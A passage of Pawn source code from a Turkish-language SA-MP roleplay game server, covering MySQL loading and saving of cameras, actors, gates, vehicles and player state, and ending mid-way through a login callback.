public CCTVYukle()
{
	static
	    rows,
	    fields;

	cache_get_data(rows, fields, g_iHandle);
	for (new i = 0; i < rows; i ++) if (i < MAX_CCTV)
	{
		CCTV[i][c_id] = cache_get_field_content_int(i, "id");
		CCTV[i][c_px] = cache_get_field_content_float(i, "c_px");
		CCTV[i][c_py] = cache_get_field_content_float(i, "c_py");
		CCTV[i][c_pz] = cache_get_field_content_float(i, "c_pz");
		CCTV[i][c_rx] = cache_get_field_content_float(i, "c_rx");
		CCTV[i][c_ry] = cache_get_field_content_float(i, "c_ry");
		CCTV[i][c_rz] = cache_get_field_content_float(i, "c_rz");
		CCTV[i][c_int] = cache_get_field_content_int(i, "c_int");
		CCTV[i][c_vw] = cache_get_field_content_int(i, "c_world");
		CCTV[i][c_angle] = cache_get_field_content_int(i, "c_angle");
		cache_get_field_content(i, "c_name", CCTV[i][c_name], g_iHandle, 64+1);
		CCTV[i][c_object] = CreateDynamicObject(CCTV_MODEL, CCTV[i][c_px], CCTV[i][c_py], CCTV[i][c_pz], CCTV[i][c_rx],CCTV[i][c_ry],CCTV[i][c_rz], .worldid=CCTV[i][c_vw], .interiorid=CCTV[i][c_int]);
	}
	printf("%d CCTV Yüklendi.",rows);
	return 1;
}

forward ActorYukle();
public ActorYukle()
{
	static
	    rows,
	    fields;

    new _bol[8][16];
	cache_get_data(rows, fields, g_iHandle);
	for (new i = 0; i < rows; i ++) if (i < MAX_ACTOR)
	{
		Actor[i][aid] = cache_get_field_content_int(i, "id");
		Actor[i][askin] = cache_get_field_content_int(i, "skin");
		Actor[i][ax] = cache_get_field_content_float(i, "x");
		Actor[i][aay] = cache_get_field_content_float(i, "y");
		Actor[i][az] = cache_get_field_content_float(i, "z");
		Actor[i][arz] = cache_get_field_content_float(i, "rz");
		Actor[i][aint] = cache_get_field_content_int(i, "int");
		Actor[i][avw] = cache_get_field_content_int(i, "vw");
		Actor[i][arenk] = cache_get_field_content_int(i, "renk");
		cache_get_field_content(i, "isim", Actor[i][aisim], g_iHandle, 32);
		cache_get_field_content(i, "anim", Actor[i][aanim], g_iHandle, 255);
		Actor[i][aactor] = CreateDynamicActor(Actor[i][askin], Actor[i][ax], Actor[i][aay], Actor[i][az], Actor[i][arz], .worldid=Actor[i][avw], .interiorid=Actor[i][aint]);
		Actor[i][adtext] = CreateDynamic3DTextLabel(Actor[i][aisim], (Actor[i][arenk] == 0 ? COLOR_GREY : Actor[i][arenk]), Actor[i][ax], Actor[i][aay], Actor[i][az] + 0.9, 15, .worldid=Actor[i][avw], .interiorid=Actor[i][aint], .testlos=1);
		strexplode(_bol, Actor[i][aanim], ",");
		ApplyDynamicActorAnimation(Actor[i][aactor],_bol[0],_bol[1],floatstr(_bol[2]),strval(_bol[3]),strval(_bol[4]),strval(_bol[5]),strval(_bol[6]),strval(_bol[7]));
	}
	printf("%d Actor Yüklendi.",rows);
	return 1;
}

forward ObjelerYukle();
public ObjelerYukle()
{
	static
	    rows,
	    fields;

	cache_get_data(rows, fields, g_iHandle);
	for (new i = 0; i < rows; i ++) if (i < MAX_OBJE)
	{
	    //i = cache_get_field_content_int(i, "id");
		Obje[i][oid] = cache_get_field_content_int(i, "id");
		Obje[i][omodel] = cache_get_field_content_int(i, "model");
		Obje[i][ox] = cache_get_field_content_float(i, "x");
		Obje[i][oy] = cache_get_field_content_float(i, "y");
		Obje[i][oz] = cache_get_field_content_float(i, "z");
		Obje[i][orx] = cache_get_field_content_float(i, "rx");
		Obje[i][ory] = cache_get_field_content_float(i, "ry");
		Obje[i][orz] = cache_get_field_content_float(i, "rz");
		Obje[i][oint] = cache_get_field_content_int(i, "int");
		Obje[i][ovw] = cache_get_field_content_int(i, "vworld");
		Obje[i][otmodel] = cache_get_field_content_int(i, "tmodel");
		cache_get_field_content(i, "tname1", Obje[i][otname1], g_iHandle, 32);
		cache_get_field_content(i, "tname2", Obje[i][otname2], g_iHandle, 32);
		Obje[i][oobje] = CreateDynamicObject(Obje[i][omodel], Obje[i][ox], Obje[i][oy], Obje[i][oz], Obje[i][orx], Obje[i][ory], Obje[i][orz], .worldid=Obje[i][ovw], .interiorid=Obje[i][oint]);
		ObjeTextureVer(i);
	}
	printf("%d Obje Yüklendi.",rows);
	return 1;
}

forward GateYukle();
public GateYukle()
{
	static
	    rows,
	    fields;

	cache_get_data(rows, fields, g_iHandle);
	for (new i = 0; i < rows; i ++) if (i < MAX_GATE)
	{
	    //i = cache_get_field_content_int(i, "id");
		Gate[i][gid] = cache_get_field_content_int(i, "id");
		Gate[i][gmodel] = cache_get_field_content_int(i, "model");
		Gate[i][gx] = cache_get_field_content_float(i, "x");
		Gate[i][gy] = cache_get_field_content_float(i, "y");
		Gate[i][gz] = cache_get_field_content_float(i, "z");
		Gate[i][grx] = cache_get_field_content_float(i, "rx");
		Gate[i][gry] = cache_get_field_content_float(i, "ry");
		Gate[i][grz] = cache_get_field_content_float(i, "rz");
		Gate[i][gox] = cache_get_field_content_float(i, "ox");
		Gate[i][goy] = cache_get_field_content_float(i, "oy");
		Gate[i][goz] = cache_get_field_content_float(i, "oz");
		Gate[i][gorx] = cache_get_field_content_float(i, "orx");
		Gate[i][gory] = cache_get_field_content_float(i, "ory");
		Gate[i][gorz] = cache_get_field_content_float(i, "orz");
		Gate[i][gint] = cache_get_field_content_int(i, "int");
		Gate[i][gvw] = cache_get_field_content_int(i, "vworld");
		Gate[i][gsahip] = cache_get_field_content_int(i, "sahip");
		Gate[i][gbirlik] = cache_get_field_content_int(i, "birlik");
		Gate[i][gtmodel] = cache_get_field_content_int(i, "tmodel");
		cache_get_field_content(i, "tname1", Gate[i][gtname1], g_iHandle, 32);
		cache_get_field_content(i, "tname2", Gate[i][gtname2], g_iHandle, 32);
		Gate[i][gobje] = CreateDynamicObject(Gate[i][gmodel], Gate[i][gx], Gate[i][gy], Gate[i][gz], Gate[i][grx],Gate[i][gry],Gate[i][grz], .worldid=Gate[i][gvw], .interiorid=Gate[i][gint]);
		Gate[i][gdurum] = 0;
		GateTextureVer(i);
	}
	printf("%d Gate Yüklendi.",rows);
	return 1;
}

InteriorYukle()
{
	new query[1024];
	new arrCoords[47][64];
	format(query, sizeof(query), "SELECT * FROM `interiors`");
	new Cache:cache = mysql_query(query,true);
	for(new i;i<cache_get_row_count();i++)
  	{
  	    mysql_fetch_row(query,i);
  	    //print(query);
	    split(query, arrCoords, '|', 64);
	    if(strval(arrCoords[0]) != 0)
	    {
			lastintid++;
	  	    //printf("id: %d", lastintid);
			Interior[lastintid][interiorid] = strval(arrCoords[0]);
			strmid(Interior[lastintid][intisim], arrCoords[1], 0, strlen(arrCoords[1]), 64);
			Interior[lastintid][intx] = floatstr(arrCoords[2]);
			Interior[lastintid][inty] = floatstr(arrCoords[3]);
			Interior[lastintid][intz] = floatstr(arrCoords[4]);
			Interior[lastintid][intangle] = floatstr(arrCoords[5]);
			Interior[lastintid][intint] = strval(arrCoords[6]);
			Interior[lastintid][inttur] = strval(arrCoords[7]);
			Interior[lastintid][intfiyat] = strval(arrCoords[8]);
		}
	}
	cache_delete(cache);
	return 1;
}

SilahYerYukle()
{
	new query[1024];
	new arrCoords[64][64];
	format(query, sizeof(query), "SELECT * FROM `silahyer`");
	new Cache:cache = mysql_query(query,true);
	for(new i;i<cache_get_row_count();i++)
  	{
  	    mysql_fetch_row(query,i);
	    split(query, arrCoords, '|', 64);
		if(strval(arrCoords[0]) != 0)
		{
			SilahYer[i][syid] = strval(arrCoords[0]);
			SilahYer[i][syposx] = floatstr(arrCoords[1]);
			SilahYer[i][syposy] = floatstr(arrCoords[2]);
			SilahYer[i][syposz] = floatstr(arrCoords[3]);
			SilahYer[i][syvworld] = strval(arrCoords[4]);
			SilahYer[i][syinterior] = strval(arrCoords[5]);
			SilahYer[i][sysilah] = strval(arrCoords[7]);
			SilahYer[i][symermi] = strval(arrCoords[8]);
			SilahYer[i][syposrx] = 93.7;
			SilahYer[i][syposry] = 120.0;
			SilahYer[i][syposrz] = 120.0;
			new silahmodel = SilahObje(SilahYer[i][sysilah]);
			SilahYer[i][syobject] = CreateDynamicObject(silahmodel,SilahYer[i][syposx], SilahYer[i][syposy], SilahYer[i][syposz], 93.7, 120.0, 120.0, SilahYer[i][syvworld], SilahYer[i][syinterior]);
			Iter_Add(GunsGround, i);
		}
	}
	cache_delete(cache);
	return 1;
}
//yaptým fin

stock SecimlerKaydet()
{
		new secimkaydet[700];
		format(secimkaydet, sizeof(secimkaydet), "UPDATE `secim` SET `sarah` = '%d', `marshall` = '%d' WHERE secid = '1'",
		Secim[sarah],
		Secim[marshall]);
		mysql_tquery(1,secimkaydet);
}
stock VerileriKaydet()
{
		new verikaydet[700];
		format(verikaydet, sizeof(verikaydet), "UPDATE `veriler` SET `gdurum` = '%d', `gposx` = '%f', `gposy` = '%f', `gposz` = '%f', `tiX` = '%f', `tiY` = '%f', `tiZ` = '%f', `tX` = '%f', `tY` = '%f', `tZ` = '%f', `tint` = '%d', `tvw` = '%d', `isbasiX` = '%f', `isbasiY` = '%f', `isbasiZ` = '%f', `isbasint` = '%d', `isbasivw` = '%d', `sevkX`  = '%f', `sevkY` = '%f', `sevkZ` = '%f', `sevkint` = '%d', `sevkvw` = '%d', `balikX` = '%f', `balikY` = '%f', `balikZ` = '%f' WHERE id = '1'",
		Veriler[gdurum],
		Veriler[gposx],
		Veriler[gposy],
		Veriler[gposz],
		Veriler[tiX],
		Veriler[tiY],
		Veriler[tiZ],
		Veriler[tX],
		Veriler[tY],
		Veriler[tZ],
		Veriler[tint],
		Veriler[tvw],
		Veriler[isbasiX],
		Veriler[isbasiY],
		Veriler[isbasiZ],
		Veriler[isbasint],
		Veriler[isbasivw],
		Veriler[sevkX],
		Veriler[sevkY],
		Veriler[sevkZ],
		Veriler[sevkint],
		Veriler[sevkvw],
		Veriler[balikX],
		Veriler[balikY],
		Veriler[balikZ]);
		mysql_tquery(1,verikaydet);
		//print(verikaydet);

		format(verikaydet, sizeof(verikaydet), "UPDATE `veriler` SET `bankX` = '%f', `bankY` = '%f', `bankZ` = '%f', `bankint` = '%d', `bankvw` = '%d', `taksiX` = '%f', `taksiY` = '%f', `taksiZ` = '%f', `reklamX` = '%f', `reklamY` = '%f', `reklamZ` = '%f', `reklamint` = '%d', `tezgahX` = '%f', `tezgahY` = '%f', `tezgahZ` = '%f', `tezgahint` = '%d', `ekipmanX` = '%f', `ekipmanY` = '%f', `ekipmanZ` = '%f', `ekipmanint` = '%d', `ekipmanvw` = '%d' WHERE id = '1'",
		Veriler[bankX],
		Veriler[bankY],
		Veriler[bankZ],
		Veriler[bankint],
		Veriler[bankvw],
		Veriler[taksiX],
		Veriler[taksiY],
		Veriler[taksiZ],
		Veriler[reklamX],
		Veriler[reklamY],
		Veriler[reklamZ],
		Veriler[reklamint],
		Veriler[tezgahX],
		Veriler[tezgahY],
		Veriler[tezgahZ],
		Veriler[tezgahint],
		Veriler[ekipmanX],
		Veriler[ekipmanY],
		Veriler[ekipmanZ],
		Veriler[ekipmanint],
		Veriler[ekipmanvw]);
		mysql_tquery(1, verikaydet);

		format(verikaydet, sizeof(verikaydet), "UPDATE `veriler` SET `pizzaX` = '%f', `pizzaY` = '%f', `pizzaZ` = '%f', `yiyecekfiyat` = '%d', `ickifiyat` = '%d', `benzinfiyat` = '%d', `ehliyetX` = '%f', `ehliyetY` = '%f', `ehliyetZ` = '%f', `aracsicilX` = '%f', `aracsicilY` = '%f', `aracsicilZ` = '%f', `otobusX` = '%f', `otobusY` = '%f', `otobusZ` = '%f', `paintX` = '%f', `paintY` = '%f', `paintZ` = '%f' WHERE id = '1'",
		Veriler[pizzaX],
		Veriler[pizzaY],
		Veriler[pizzaZ],
		Veriler[yiyecekfiyat],
		Veriler[ickifiyat],
		Veriler[benzinfiyat],
		Veriler[ehliyetX],
		Veriler[ehliyetY],
		Veriler[ehliyetZ],
		Veriler[aracsicilX],
		Veriler[aracsicilY],
		Veriler[aracsicilZ],
		Veriler[otobusX],
		Veriler[otobusY],
		Veriler[otobusZ],
		Veriler[paintX],
		Veriler[paintY],
		Veriler[paintZ]);
		mysql_tquery(1, verikaydet);

		format(verikaydet, sizeof(verikaydet), "UPDATE `veriler` SET `cctvx` = '%f', `cctvy` = '%f', `cctvz` = '%f', `cctvint` = '%d', `cctvvw` = '%d', `aractahta` = '%s', `aractahtax` = '%f', `aractahtay` = '%f', `aractahtaz` = '%f', `aractahtarz` = '%f', `aractahtaint` = '%d', `aractahtavw` = '%d', `aractahtayazix` = '%f', `aractahtayaziy` = '%f', `aractahtayaziz` = '%f' WHERE id = '1'",
		Veriler[cctvx],
		Veriler[cctvy],
		Veriler[cctvz],
		Veriler[cctvint],
		Veriler[cctvvw],
		Veriler[aractahta],
		Veriler[aractahtax],
		Veriler[aractahtay],
		Veriler[aractahtaz],
		Veriler[aractahtarz],
		Veriler[aractahtaint],
		Veriler[aractahtavw],
		Veriler[aractahtayazix],
		Veriler[aractahtayaziy],
		Veriler[aractahtayaziz]);
		mysql_tquery(1, verikaydet);
		//print(verikaydet);
		return 1;
}
stock AracKaydet(vid)
{
	if(IsValidVehicle(vid))
	{
		new sorgu[700];
		format(sorgu, sizeof(sorgu), "UPDATE `araclar` SET `model` = '%d', `posx` = '%f', `posy` = '%f', `posz` = '%f', `posa` = '%f', `interior` = '%d'  WHERE `sqlid` = '%d'",Arac[vid][amodel],Arac[vid][aposx],Arac[vid][aposy],Arac[vid][aposz],Arac[vid][aposa],Arac[vid][ainterior],Arac[vid][aid]);
	  	mysql_tquery(1,sorgu);
	  	format(sorgu, sizeof(sorgu), "UPDATE `araclar` SET `vworld` = '%d', `renk1` = '%d', `renk2` = '%d', `owner` = '%d', `hasar` = '%f', `tip` = '%d', `fiyat` = '%d' WHERE `sqlid` = '%d'", Arac[vid][avworld], Arac[vid][arenk1], Arac[vid][arenk2], Arac[vid][aowner], Arac[vid][ahasar], Arac[vid][atip], Arac[vid][afiyat], Arac[vid][aid]);
	  	mysql_tquery(1,sorgu);
	  	format(sorgu, sizeof(sorgu), "UPDATE `araclar` SET `spawn` = '%d', `spawnsatin` = '%d', `plaka` = '%s', `kilit` = '%d', `kilittip` = '%d', `alarm` = '%d', `cezali` = '%d' WHERE `sqlid` = '%d'", Arac[vid][aspawn], Arac[vid][aspawnsatin], Arac[vid][aplaka], Arac[vid][akilit],Arac[vid][akilittip],Arac[vid][aalarm],cezali[vid],Arac[vid][aid]);
		mysql_tquery(1,sorgu);
		format(sorgu, sizeof(sorgu), "UPDATE `araclar` SET `immo` = '%d', `benzin` = '%f', `ceza` = '%s', `cezamiktar` = '%d', `paintjob` = '%d', `exhaust` = '%d', `frontbumper` = '%d', `rearbumper` = '%d' WHERE `sqlid` = '%d'", Arac[vid][aimmo],Arac[vid][abenzin],Arac[vid][aceza],Arac[vid][acezamiktar],Arac[vid][apaintjob],Arac[vid][aexhaust],Arac[vid][afrontbumper],Arac[vid][arearbumper],Arac[vid][aid]);
		mysql_tquery(1,sorgu);
		format(sorgu, sizeof(sorgu), "UPDATE `araclar` SET `roof` = '%d', `spoilers` = '%d', `sideskirts` = '%d', `bullbars` = '%d', `tekerlek` = '%d', `carstereo` = '%d', `hidrolik` = '%d', `nitro` = '%d', `panels` = '%d' WHERE `sqlid` = '%d'",Arac[vid][aroof],Arac[vid][aspoilers],Arac[vid][asideskirts],Arac[vid][abullbars],Arac[vid][atekerlek],Arac[vid][acarstereo],Arac[vid][ahidrolik],Arac[vid][anitro],Arac[vid][apanels],Arac[vid][aid]);
		mysql_tquery(1,sorgu);
		new __string[64];
		format(__string, 64, "%s", EscapeString(Arac[vid][atextyazi]));
		format(sorgu, sizeof(sorgu), "UPDATE `araclar` SET `doors` ='%d', `lights` = '%d', `tires` = '%d', `yedekanahtar` = '%d', `km` = '%d', `metre` = '%d', `textdurum` = '%d', `textyazi` = '%s', `birlik` = '%d', `birliktip` = '%d' WHERE `sqlid` = '%d'",Arac[vid][adoors],Arac[vid][alights],Arac[vid][atires],Arac[vid][yedekanahtar],Arac[vid][akm],Arac[vid][ametre],Arac[vid][atextdurum],__string,Arac[vid][abirlik],Arac[vid][abirliktip],Arac[vid][aid]);
		mysql_tquery(1,sorgu);
		//yaptým
		format(sorgu, sizeof(sorgu), "UPDATE `araclar` SET `agelir` = '%d', `aisyeri` = '%d', `sure` = '%d', `neon` = '%d', `silah1` = '%d', `mermi1` = '%d', `silah2` = '%d', `mermi2` = '%d', `silah3` = '%d', `mermi3` = '%d', `siren` = '%d' WHERE `sqlid` = '%d'",
        Arac[vid][agelir],
        Arac[vid][aisyeri],
		Arac[vid][asure],
		Arac[vid][aneon],
		Arac[vid][silah1],
		Arac[vid][mermi1],
		Arac[vid][silah2],
		Arac[vid][mermi2],
		Arac[vid][silah3],
		Arac[vid][mermi3],
		Arac[vid][siren],
		Arac[vid][aid]);
		//yaptým fin
		mysql_tquery(1, sorgu);
		format(sorgu, sizeof(sorgu), "UPDATE `araclar` SET `vergi` = '%d', `rutbe` = '%d', `benzintip` = '%d', `hizsabit` = '%d', `matA` = '%d', `matB` = '%d', `matC` = '%d', `matD` = '%d', `matE` = '%d', `birlikdestek` = '%d', `sigorta` = '%d', `parcalandi` = '%d' WHERE `sqlid` = '%d'",
        Arac[vid][vergi],
        Arac[vid][arutbe],
		Arac[vid][abenzintip],
		Arac[vid][ahizsabit],
		Materyal[vid][A],
		Materyal[vid][B],
		Materyal[vid][C],
		Materyal[vid][D],
		Materyal[vid][E],
		Arac[vid][birlikdestek],
		Arac[vid][sigorta],
		Arac[vid][parcalandi],
		Arac[vid][aid]);
		mysql_tquery(1, sorgu);
		format(sorgu, sizeof(sorgu), "UPDATE `araclar` SET `esrar` = '%d', `amfetamin` = '%d', `metamfetamin` = '%d', `lsd` = '%d', `extacy` = '%d', `kokain` = '%d', `eroin` = '%d', `morfin` = '%d', `MDA` = '%d', `ahurda` = '%d' WHERE `sqlid` = '%d'",
		AUyusturucu[vid][esrar],
		AUyusturucu[vid][amfetamin],
		AUyusturucu[vid][metamfetamin],
		AUyusturucu[vid][lsd],
		AUyusturucu[vid][extacy],
		AUyusturucu[vid][kokain],
		AUyusturucu[vid][eroin],
		AUyusturucu[vid][morfin],
		AUyusturucu[vid][MDA],
		Arac[vid][ahurda],
		Arac[vid][aid]);
		mysql_tquery(1, sorgu);
	}
    return 1;
}
BilgileriSifirla(playerid)
{
	talep[playerid] = 0;
	talepMesaj[playerid] = "";
    EvCheckpointYazi[playerid] = 1;
	SetPVarInt(playerid, "SirtSilah", -1);
	gunindex[playerid] = -1;
    silahIndex[playerid] = 0;
	DeletePVar(playerid, "MDCGirisTimer");
	DeletePVar(playerid, "HizGizle");
	DeletePVar(playerid, "BenzinGizle");
	DeletePVar(playerid, "KmGizle");
	DeletePVar(playerid, "TaksimetreGizle");
	DeletePVar(playerid, "TelElinde");
	DeletePVar(playerid, "EsyaTasiModel");
	DeletePVar(playerid, "EsyaSeciyor");
    objeduzenle[playerid] = 0;
    objegoruyor[playerid] = 0;
	DeletePVar(playerid, "CCTV_Izliyor");
	DeletePVar(playerid, "CCTV_Duzenliyor");
	DeletePVar(playerid, "DuzenleCCTV");
	gTx[playerid] = 0;
	gTy[playerid] = 0;
	gTz[playerid] = 0;
	gTint[playerid] = 0;
	gTvw[playerid] = 0;
    TumOyuncularEngelli[playerid] = 0;
	SetPVarInt(playerid, "PwepTimer", 0);
    Pwep[playerid] = 0;
    Pupdate[playerid] = 0;
    
    gReklamKapa[playerid] = false;
    DeletePVar(playerid, "GraffitiDuzenle");
    gOtur[playerid] = false;
    hiletime[playerid] = 0;
	gDedektif[playerid] = 0;
	Tuzak[playerid] = -1;
    gAracTime[playerid] = 0;
	reklambirlik[playerid] = 0;
	adminpm[playerid] = 0;
    UpdateDynamic3DTextLabelText(gRutbeIsim[playerid], 0x8D8DFFFF, "");
    UpdateDynamic3DTextLabelText(aworkIsim[playerid], 0x800000FF, "");
    SetPVarInt(playerid,"ac_car_id",-1);
	gAFKTIMER[playerid] = 0;
	SetPVarInt(playerid, "MenuTip", 0);
	SetPVarInt(playerid, "MenuFiyat", 0);
	SetPVarInt(playerid, "MenuModel", 0);
	SetPVarString(playerid, "MenuAd", "Yok");
	SetPVarInt(playerid, "SoygunID", -1);
    gKameraKurdu[playerid] = false;
    gTvIzliyo[playerid] = false;
    SetPVarInt(playerid, "TGorev", 0);
	gGarajGirdi[playerid] = false;
    pARMO[playerid] = 0.0;
    pHP[playerid] = 0.0;
    gPBTeam[playerid] = 0;
	gMekanGeziyor[playerid] = false;
    gTIslemde[playerid] = false;
    aTIslemde[playerid] = false;
	gBuluyor[playerid] = false;
	gMaske[playerid] = 0;
	gToolkit[playerid] = 0;
	SetPVarInt(playerid, "EvSatisID", 0);
	SetPVarInt(playerid, "EvSatici", -1);
	SetPVarInt(playerid, "EvSatisFiyat", 0);
	tCheckpoint[playerid] = 0;
	SetPVarInt(playerid, "MobilyaFiyat", 0);
    SetPVarInt(playerid, "PosKaydetme", 0);
	dilkullaniyor[playerid] = false;
	denemegiris[playerid] = 2;
	Karakter[playerid][kokaintohum] = 0;
	Karakter[playerid][erointohum] = 0;
	Karakter[playerid][medisbasi] = 0;
	Karakter[playerid][sisbasi] = 0;
	PistolElinde[playerid] = 0;
	DeagleElinde[playerid] = 0;
	DestekTimer[playerid] = 0;
	DestekTimer2[playerid] = 0;
	PizzaTimer[playerid] = 0;
	SetPVarInt(playerid, "AracParcaliyor", 0);
	SetPVarInt(playerid, "Yarali", 0);
	UKutuTasiyor[playerid] = 0;
	AFK[playerid] = false;
	bunnyhop[playerid] = 0;
	SectigiYakit[playerid] = 0;
	SectigiHizSabit[playerid] = 0;
	SectigiAracRenk1[playerid] = 1;
	SectigiAracRenk2[playerid] = 1;
	SectigiImmo[playerid] = 1;
	SectigiKilit[playerid] = 1;
	SectigiAlarm[playerid] = 1;
	MateryalSilah[playerid] = 0;
	KutuTasiyor[playerid] = 0;
	dovustil[playerid] = 4;
	bahistip[playerid] = 0;
	bahispara[playerid] = 0;
	tarafseciyo[playerid] = 0;
	gateduzen[playerid] = 0;
	gateduzenle[playerid] = 0;
	gategoruyor[playerid] = 0;
	silahalev[playerid] = 0;
	factayarliyo[playerid] = 0;
	SectigiKiyafet[playerid] = 0;
	KiyafetUcreti[playerid] = 0;
	tisbasi[playerid] = 0;
    sarkidinliyo[playerid] = 0;
	meslekbul[playerid] = 0;
	sandalyeobje[playerid] = 0;
	otobuste[playerid] = 0;
	for(new i; i < 3; i++) tPos[playerid][i] = 0;
	for(new i; i < 3; i++) Tezgah[playerid][i] = 0;
	for(new i=0;i<5;i++) aksesuar[playerid][i][giyilmis] = false;
	renk1ayarliyo[playerid] = 0,renk2ayarliyo[playerid] = 0;
	kArac[playerid] = 0;
	pdaksesuarda[playerid] = 0;
	mcaksesuarda[playerid] = 0;
	mobilyaci[playerid] = 0;
	mobilyaci2[playerid] = 0;
	mobilyaci3[playerid] = 0;
	mobilyaci4[playerid] = 0;
	mobilyaci5[playerid] = 0;
	ClearWeaponCookie(playerid);
	Karakter[playerid][birlik] = 0;
	Karakter[playerid][aclik] = 0;
	Karakter[playerid][susuzluk] = 0;
	PDDestek[playerid] = 0;
	ehliyettesti[playerid] = 0;
	ehliyetaraci[playerid] = 0;
	ehliyetuyari[playerid] = 0;
	ehliyetcp[playerid] = 0;
	tDuty[playerid] = 0;
 	aDuty[playerid] = 0;
 	aDuty2[playerid] = 0;
	DamagedHP[playerid] = -1;
	DeletePVar(playerid, "IsyeriBuy");
	if(Taksi[playerid])
	{
	    SetVehicleToRespawn(Taksi[playerid]);
	    Taksi[playerid] = 0;
	}
	if(PlayerPBing[playerid])
	{
		PBPlayers--;
	}
	Karakter[playerid][graffitizin] = 0;
	Karakter[playerid][askin] = 0;
	Karakter[playerid][ehliyet] = 0;
	Karakter[playerid][kasseviye] = 0;
	Karakter[playerid][kaspuan] = 0;
	format(Karakter[playerid][anick],24, "admin");
	Karakter[playerid][sysobjectd] = 0;
	Karakter[playerid][suruklenen] = -1;
	Karakter[playerid][surukleyen] = -1;
	GozBaglayan[playerid] = 0;
	Karakter[playerid][odun] = 0;
	Karakter[playerid][GozBaglamaBezi] = 0;
	GozBaglandi[playerid] = -1;
	PlayerPBing[playerid] = false;
    PlayerPBKills[playerid] = 0;
	AdminDuyma[playerid] = 0;
	format(Karakter[playerid][RaporTarih], 64, "");
	strmid(Karakter[playerid][RaporMesaj], "Bos", 0, strlen("Bos"), 255);
	UstunuAra[playerid] = -1;
	Maske[playerid] = false;
	Maske2[playerid] = false;
	aksEdit[playerid] = -1;
	SectigiAksesuar[playerid] = 0;
	Modifiyede[playerid] = 0;
	Onizlemede[playerid] = 0;
	AksesuarUcreti[playerid] = 0;
	TaksiCagrisi[playerid] = 0;
	SevkiyatCheckpoint[playerid] = 0;
	Karakter[playerid][gYapiyor] = 0;
	PizzaGorevde[playerid] = 0;
	SevkiyatGorev[playerid] = 0;
	LojGorevde[playerid] = 0;
	KamGorevde[playerid] = 0;
	EleGorevde[playerid] = 0;
	PizzaCheckpoint[playerid] = 0;
	DeletePVar(playerid, "HavaleNO");
	DeletePVar(playerid, "Player_Tel_Rehber");
	SetPVarInt(playerid, "Gorusmeid",INVALID_PLAYER_ID);
	gSpectateID[playerid] = 0;
	gSpectateType[playerid] = 0;
	SonArac[playerid] = 0;
	Karakter[playerid][maske] = 0;
	Karakter[playerid][maskeno] = 0;
	Karakter[playerid][meslek] = 0;
    Karakter[playerid][misbasi] = 0;
    Karakter[playerid][mekisbasi] = 0;
	Arama[playerid][0] = 0;
	Arama[playerid][1] = 0;
	Arama[playerid][2] = 0;
	Karakter[playerid][Rapor] = 0;
	Yayin[playerid] = 1;
	Yayinda[playerid] = 0;
	KDuzenleVar[playerid] = 0;
 	Tasiyor[playerid] = 0;
 	SelectObjectTur[playerid] = 0;
	DeletePVar(playerid, "UyusturucuToplaID");
	UyusturucuTeklif[playerid] = 0;
	UyusturucuTeklifMiktar[playerid] = 0;
	UyusturucuTeklifFiyat[playerid] = 0;
	DeletePVar(playerid, "SatinalAracSira");
    SatinalArac[playerid] = INVALID_VEHICLE_ID;
    TaserDurum[playerid] = 0;
    AracListeAracD[playerid] = 0;
	PMAcik[playerid] = 0;
	Kelepceli[playerid] = 0;
	adpmd[playerid] = 0;
	lastpm[playerid] = -1;
	Girdi[playerid] = false;
	girishakki[playerid] = 0;
	BigEar[playerid] = 0;
	AnimasyonYapiyor[playerid] = false;
	DeletePVar(playerid, "aww");
	Karakter[playerid][kimlikno] = 0;
	Karakter[playerid][level] = 0;
	Karakter[playerid][para] = 0;
	Karakter[playerid][skin] = 1;
	Karakter[playerid][armor] = 0;
	Karakter[playerid][hp] = 100.0;
	Karakter[playerid][cinsiyet] = 0;
	Karakter[playerid][yas] = 0;
	Karakter[playerid][uyruk] = 0;
	Karakter[playerid][adminlevel] = 0;
	Karakter[playerid][aGirdi] = 0;
	Karakter[playerid][kilit] = 0;
	Karakter[playerid][ck] = 0;
	Karakter[playerid][isbasi] = 0;
	Karakter[playerid][fbiisbasi] = 0;
	Karakter[playerid][fdisbasi] = 0;
	Karakter[playerid][medisbasi] = 0;
	Karakter[playerid][isbasiskin] = 0;
	Karakter[playerid][telno] = 0;
	aDuty[playerid] = 0;
	aDuty2[playerid] = 0;
	aracsatiyo[playerid] = 0;
	aracfiyat[playerid] = 0;
	aracide[playerid] = 0;
	aracwhois[playerid] = -1;
    SetPVarInt(playerid, "AracTeklifEdiyor", 0);
    DeletePVar(playerid, "AracTeklifVeren");
    DeletePVar(playerid, "AracTeklifArac");
    DeletePVar(playerid, "AracTeklifFiyat");
    rennieRadyo[playerid] = 0;
	RadyoVirtual[playerid] = 0;
    RadyoOyuncu[playerid] = -1;
    Radyorenniem[playerid] = 0;
    selamlas[playerid] = 0;
    selamturu[playerid] = 0;
    rennieradyopos[playerid][0] = 0;
	rennieradyopos[playerid][1] = 0;
	rennieradyopos[playerid][2] = 0;
	rennieradyopos[playerid][3] = 0;
    format(rennieRadyoURL[playerid], 256, "");
}

RehberYukle(playerid)
{
	new query[4096],_isim[32],_numara;
	format(query, sizeof(query), "SELECT * FROM `rehber` WHERE `oyuncuID` = '%d'", Karakter[playerid][sqlid]);
	new Cache:cache = mysql_query(query,true);
	static rows, fields;
	cache_get_data(rows, fields, g_iHandle);
	strdel(query, 0, strlen(query));
	for (new i = 0; i < rows; i ++)
	{
		cache_get_field_content(i, "rehberIsim", _isim, g_iHandle, 32);
		_numara = cache_get_field_content_int(i, "rehberNumara");
		format(query, sizeof(query), "%s%s|%d|",query,_isim,_numara);
	}
	cache_delete(cache);
	SetPVarString(playerid, "Player_Tel_Rehber", query);
}

forward OnQueryFinished(extraid, threadid);
public OnQueryFinished(extraid, threadid)
{
	if(Debug) printf("OnQueryFinished(%d, %d)",extraid, threadid);
	if (!IsPlayerConnected(extraid))
	    return 0;

	static
	    rows,
	    fields
	;
	switch (threadid)
	{
	    case 1:
	    {
	        cache_get_data(rows, fields, g_iHandle);
	        new name[MAX_PLAYER_NAME+1], _name[MAX_PLAYER_NAME+1], ksifre[128];
			cache_get_field_content(0, "sifre", ksifre, g_iHandle, 128);
	        if(strcmp(Karakter[extraid][sifre], ksifre)) { Kick(extraid); return 0; }
	        GetPlayerName(extraid, name, MAX_PLAYER_NAME+1);
	        cache_get_field_content(0, "isim", _name, g_iHandle, MAX_PLAYER_NAME+1);
	        if(strcmp(name, _name)) { SetPlayerName(extraid, _name); }
	        cache_get_field_content(0, "isim", Karakter[extraid][kisim], g_iHandle, MAX_PLAYER_NAME+1);
			Karakter[extraid][posx] = cache_get_field_content_float(0, "posx");
